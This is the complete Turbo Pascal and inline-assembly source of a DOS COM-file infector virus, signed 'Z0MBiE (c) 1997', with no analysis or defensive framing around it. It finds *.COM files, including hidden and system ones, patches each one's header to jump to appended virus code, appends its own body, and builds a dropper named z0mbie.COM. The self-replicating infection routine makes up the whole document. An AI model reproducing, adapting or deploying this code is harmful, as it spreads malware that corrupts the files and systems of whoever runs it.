   {$M 1024,0,0}           { memory }

   {$R-,S-,I-,Q-}          { all checking OFF }
   {$G+,N-,E-}             { code generation: CPU on, NPU,emulation off }
   {$A-,B-,X+,V-,T-,P-,O-} { options }
   {$F-}                   { FAR calls }
   {$D+,L+}                { DEBUG info }

   procedure Main; Near; forward;
   procedure CodeEnd; forward;
   procedure getSI; forward;
   procedure saveHeader; forward;

   procedure EntryPoint; Near; assembler;
     asm
       mov al, 55h
       out 80h, al
       xor al, al
       in al, 80h
       cmp al, 55h
       jne @@3

       CALL getSI
       mov bx, si

   @@0:jmp @@1

       LEA SI, saveHeader[BX]
       MOV DI, 100h
       MOV CX, 32
       CLD
       REP MOVSB

       jmp @@2

   @@1:mov byte ptr cs:[bx + offset @@0 + 1], 0

   @@2:CALL Main

   @@3:MOV SI, 100H
       JMP SI
     end;

   procedure ComFiles; assembler; asm DB '*.COM',0 end;

   procedure GetSI; assembler;
     asm
       CALL @@1
   @@1:POP SI
       SUB SI, OFFSET @@1
     end;

   const
     faReadOnly  = $01;
     faHidden    = $02;
     faSystem    = $04;
     faVolumeID  = $08;
     faDirectory = $10;
     faArchive   = $20;
     faAnyFile   = $3F;

   type
     PSearchRec = ^TSearchRec;
     TSearchRec = record
       Drive      : Char;
       Name8      : array[1..8] of Char;
       Ext3       : array[1..3] of Char;
       SearchAttr : Byte;
       Num        : Word;
       Cluster    : Word;
       Unused     : array[1..4] of byte;
       Attr       : Byte;
       Time       : Word;
       Date       : Word;
       Size       : Longint;
       Name       : array[1..12] of Char;
     end;



   procedure FindFirst(Dta : PSearchRec; Attr : Byte; Files : PChar); assembler;
     asm
       PUSH DS

       MOV AH, 2FH
       INT 21H
       PUSH ES
       PUSH BX

       MOV AH, 1AH
       LDS DX, Dta
       INT 21H

       MOV AH, 4EH
       LDS DX, Files
       XOR CH, CH
       MOV CL, Attr
       INT 21H

       MOV AH, 1AH
       POP DX
       POP DS
       INT 21H

       POP DS
     end;

   procedure message; assembler;
     asm
       DB 'Z0MBiE (c) 1997'
     end;

   procedure FindNext(Dta : PSearchRec); assembler;
     asm
       PUSH DS

       MOV AH, 2FH
       INT 21H
       PUSH ES
       PUSH BX

       MOV AH, 1AH
       LDS DX, Dta
       INT 21H

       MOV AH, 4FH
       INT 21H

       MOV AH, 1AH
       POP DX
       POP DS
       INT 21H

       POP DS
     end;

   function CF : Boolean;  { or SETALC for Pentium (DB 0D6H) }
     inline($B0/$01/    { MOV AL, 1 }
            $72/$02/    { JC $+4    }
            $B0/$00);   { MOV AL, 0 }

   procedure Write(X : PChar);
     var
       C : Char;
     begin
       repeat
         C := X[0];
         if C = #0 then Break;
         asm
           MOV AL, C
           INT 29H
         end;
         Inc(X);
       until false;
     end;

   function openFile(FileName : Pointer) : Word; assembler;
     asm
       PUSH DS
       MOV AX, 3D02H
       LDS DX, FileName
       INT 21H
       POP DS
     end;

   procedure closeFile(Handle : Word); assembler;
     asm
       MOV AH, 3EH
       MOV BX, Handle
       INT 21H
     end;

   procedure readFile(Handle : Word; DataPtr : Pointer; Count : Word); assembler;
     asm
       PUSH DS
       MOV AH, 3FH
       MOV BX, Handle
       LDS DX, DataPtr
       MOV CX, Count
       INT 21H
       POP DS
     end;

   procedure writeFile(Handle : Word; DataPtr : Pointer; Count : Word); assembler;
     asm
       PUSH DS
       MOV AH, 40H
       MOV BX, Handle
       LDS DX, DataPtr
       MOV CX, Count
       INT 21H
       POP DS
     end;

   procedure Seek(Handle : Word; Pos : Longint); assembler;
     asm
       MOV AX, 4200H
       MOV BX, Handle
       MOV CX, Pos.Word[2]
       MOV DX, Pos.Word[0]
       INT 21H
     end;

   procedure SaveHeader; assembler;
     asm
       DB '0123456789abcdef'
       DB '0123456789abcdef'
     end;

   procedure Copy(Source, Dest : Pointer; Count : Word); assembler;
     asm
       PUSH DS
       LDS SI, Source
       LES DI, Dest
       MOV CX, Count
       CLD
       REP MOVSB
       POP DS
     end;

   procedure Main;
     var
       Shift : Word;
       Dta : TSearchRec;

     procedure InfectFile;
       var
         Handle : Word;
         header : array[1..32] of byte;
       begin

         if (Dta.Size <= 2000) or (Dta.Size >= 64000) then Exit;

         handle := openFile(@Dta.Name);
         if CF then Exit;

         readFile(handle, @header, 32);
         if (header[1] <> $E8) or (header[4] <> header[2]) then
         if (header[1] <> ord('M')) and
            (header[1] <> ord('Z')) then { 1 - ¥ ®è¨¡ª ! }

         begin

           copy(@header, Ptr(CSeg,ofs(SaveHeader)+shift), 32);

           header[1] := $E8;
           header[2] := lo(dta.size-3);
           header[3] := hi(dta.size-3);
           header[4] := header[2];

           seek(handle, 0);
           writeFile(handle, @header, 32);

           seek(handle, dta.size);
           writefile(handle, Ptr(CSeg, shift), ofs(CodeEnd));
         end;

         closeFile(Handle);
       end;

     begin

       GetSI;
       asm MOV Shift, SI end;

       FindFirst(@Dta, faArchive+faReadOnly+faHidden+faSystem, Ptr(CSeg,Ofs(ComFiles)+Shift));

       while not CF do
       begin

         InfectFile;

         FindNext(@Dta);
       end;
     end;

   procedure CodeEnd; begin end;

   const
     FileName : String[10] = 'z0mbie.COM'#0;

   begin
     asm
       MOV AH, 3CH
       MOV DX, OFFSET FileName[1]
       XOR CX, CX
       INT 21H

       XCHG BX, AX

       MOV AH, 40H
       PUSH CS
       POP DS
       MOV DX, OFFSET EntryPoint
       MOV CX, OFFSET CodeEnd
       INT 21H

       MOV AH, 3EH
       INT 21H
     end;
   end.
